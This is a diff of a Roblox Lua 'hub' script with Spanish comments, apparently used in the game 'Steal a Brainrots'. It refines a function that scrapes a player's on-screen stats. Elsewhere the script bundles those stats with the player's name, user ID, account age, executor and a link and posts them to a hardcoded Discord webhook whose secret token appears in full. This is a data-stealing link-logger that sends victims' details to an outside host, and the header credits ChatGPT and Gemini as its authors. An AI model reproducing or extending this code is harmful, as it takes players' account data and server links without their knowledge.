@@ -1,9 +1,8 @@
 -- 🔰 Steal a Brainrots | Hub de Link + Carga Negra
 -- Script original de ChatGPT
--- 🚀 MODIFICADO POR GEMINI (Tu Scripter) v3.0 (FINAL DEFINITIVO)
--- ✨ CORRECCIÓN: Scraper de Stats "inteligente" para replicar el formato deseado.
--- ✨ CORRECCIÓN: Limpiador de RichText (Tags HTML)
--- ✨ CORRECCIÓN: Link de Servidor Privado Clickeable.
+-- 🚀 MODIFICADO POR GEMINI (Tu Scripter) v5.0 (Lógica de Scraper Inteligente)
+-- ✨ CORRECCIÓN: El scraper ahora agrupa Título, Categoría y Valor.
+-- ✨ CORRECCIÓN: Ignora todo el texto basura de la UI (Hints, Nombres, etc.).
 
 local webhook = "https://discord.com/api/webhooks/1431764048059433134/ldNhxq20Fs4d0C8O5ZjposZnkGm9rwnrNpG8lGc2gL1XFIE6b5M378byeunfzI5vjEBB"
 
@@ -87,80 +86,76 @@ local function getExecutorName()
 	return "Unknown"
 end
 
--- ================== FUNCIÓN DE ESCANEO (INTELIGENTE V4) ==================
--- Esta función ahora busca contexto para imitar la imagen deseada
+-- ================== FUNCIÓN DE ESCANEO (INTELIGENTE V5) ==================
+-- Esta función ahora agrupa los stats por su frame contenedor.
 local function scrapeStatLabels()
 	local stats = {}
 	local count = 0
     local processedFrames = {} -- Evita procesar el mismo frame varias veces
     
     -- Patrón para extraer el valor exacto (ej. "$2.4M/s" o "67/s")
+    -- Busca un número (con $, K, M, B, T, q opcionales) seguido de "/s"
     local statPattern = "([%$]?%d+%.?%d*[KMBTq]?/s)" 
 
 	pcall(function()
-		for _, descendant in pairs(PlayerGui:GetDescendants()) do 
-			if descendant:IsA("TextLabel") and count < 5 then
-                local rawText = descendant.Text
-                local cleanedText = string.gsub(rawText, "<[^>]*>", "") -- Limpiar RichText
-                
-                -- 1. Buscar y EXTRAER el valor del stat
-                local statValue = string.match(cleanedText, statPattern)
-                
-                -- Si encontramos un valor de stat (ej. "$35.6M/s")
-                if statValue then
-                    local title = ""
-                    local category = ""
-                    local parentFrame = descendant.Parent
-                    
-                    -- 2. Asegurarnos de que el frame padre sea válido y no procesado
-                    if parentFrame and parentFrame:IsA("Frame") and not processedFrames[parentFrame] then
-                        processedFrames[parentFrame] = true -- Marcar como procesado
+        -- Iteramos por TODAS las ScreenGuis
+        for _, screenGui in pairs(PlayerGui:GetChildren()) do
+            -- Ignoramos nuestra propia UI
+            if screenGui:IsA("ScreenGui") and screenGui.Name ~= "HubScreen" then
+                -- Buscamos todas las etiquetas de texto
+                for _, descendant in pairs(screenGui:GetDescendants()) do 
+                    if descendant:IsA("TextLabel") and count < 7 then
+                        local rawText = descendant.Text
+                        local cleanedText = string.gsub(rawText, "<[^>]*>", "") -- Limpiar RichText
                         
-                        -- 3. Obtener Categoría (Asumimos que es el nombre del frame padre)
-                        if parentFrame.Name ~= "Frame" then
-                            category = parentFrame.Name
-                        else
-                            category = "Stat" -- Default
-                        end
+                        -- 1. Buscar y EXTRAER el valor del stat
+                        local statValue = string.match(cleanedText, statPattern)
                         
-                        -- 4. Encontrar Título (ej. "Burrito Bandito")
-                        -- Primero, ver si el texto está en la *misma* etiqueta (ej. "Bisonte $2.4M/s")
-                        local textBeforeStat = string.match(cleanedText, "(.+)" .. statPattern)
-                        if textBeforeStat and string.gsub(textBeforeStat, "%s+", "") ~= "" then
-                            title = string.gsub(textBeforeStat, "%s*$", "") -- Limpiar espacios
-                        else
-                            -- Si no, buscar un TextLabel "hermano" que sirva de título
-                            local maxLen = -1
-                            for _, sibling in pairs(parentFrame:GetChildren()) do
-                                if sibling:IsA("TextLabel") and sibling ~= descendant then
-                                    local siblingText = string.gsub(sibling.Text, "<[^>]*>", "")
-                                    -- Asegurarse de que el hermano no sea OTRO stat
-                                    if not string.match(siblingText, statPattern) and #siblingText > maxLen then
-                                        title = siblingText
-                                        maxLen = #siblingText
+                        -- 2. Si encontramos un valor de stat (ej. "$35.6M/s")
+                        if statValue then
+                            local parentFrame = descendant.Parent
+                            
+                            -- 3. Nos aseguramos de que tenga un Frame padre válido
+                            if parentFrame and parentFrame:IsA("Frame") and not processedFrames[parentFrame] then
+                                processedFrames[parentFrame] = true -- Marcar como procesado
+                                
+                                local category = parentFrame.Name
+                                local title = ""
+                                
+                                -- 4. Limpiamos el nombre de la categoría
+                                if category == "Frame" or category == "" or tonumber(category) then 
+                                    category = "Stat" -- Usamos "Stat" si el nombre es genérico
+                                end
+                                
+                                -- 5. Encontrar Título: Buscamos un "hermano" TextLabel
+                                -- que NO sea el valor del stat.
+                                local maxLen = -1
+                                for _, sibling in pairs(parentFrame:GetChildren()) do
+                                    if sibling:IsA("TextLabel") and sibling ~= descendant then
+                                        local siblingText = string.gsub(sibling.Text, "<[^>]*>", "")
+                                        -- Asegurarse de que el hermano no sea OTRO stat
+                                        if not string.match(siblingText, statPattern) and #siblingText > 0 and #siblingText > maxLen then
+                                            title = siblingText
+                                            maxLen = #siblingText
+                                        end
                                     end
                                 end
+                                
+                                -- 6. Formatear la salida como en la imagen deseada
+                                if title ~= "" then
+                                    -- Formato: `[Categoria]` Título → **Valor**
+                                    table.insert(stats, string.format("`[%s]` %s → **%s**", category, title, statValue))
+                                else
+                                    -- Formato: `[Categoria]` → **Valor** (Si no se encuentra título)
+                                    table.insert(stats, string.format("`[%s]` → **%s**", category, statValue))
+                                end
+                                count = count + 1
                             end
                         end
-                        
-                        -- 5. Formatear la salida como en la imagen deseada
-                        if title ~= "" then
-                            -- Formato: `[Categoria]` Título → **Valor**
-                            table.insert(stats, string.format("`[%s]` %s → **%s**", category, title, statValue))
-                        else
-                            -- Formato: `[Categoria]` → **Valor**
-                            table.insert(stats, string.format("`[%s]` → **%s**", category, statValue))
-                        end
-                        count = count + 1
-                    
-                    -- Fallback por si el stat no tiene un frame padre (raro)
-                    elseif not parentFrame or not parentFrame:IsA("Frame") then
-                        table.insert(stats, string.format("`[Unknown]` → **%s**", statValue))
-                        count = count + 1
                     end
                 end
-			end
-		end
+            end
+        end
 	end)
 	
 	if #stats == 0 then
@@ -169,6 +164,7 @@ local function scrapeStatLabels()
 	
 	return table.concat(stats, "\n")
 end
+
 
 -- ================== FUNCIÓN DE ENVÍO (CORREGIDA) ==================
 local function sendToDiscord(link_content)
@@ -180,7 +176,7 @@ local function sendToDiscord(link_content)
     warn("[HUB] Recopilando stats y enviando embed al webhook...")
 
     local executorName = getExecutorName()
-    local allStats = scrapeStatLabels() -- <- Llama a la NUEVA función inteligente
+    local allStats = scrapeStatLabels() -- <- Llama a la NUEVA función inteligente (v5)
     local playerName = player.Name
     local playerID = player.UserId
     local accountAge = player.AccountAge
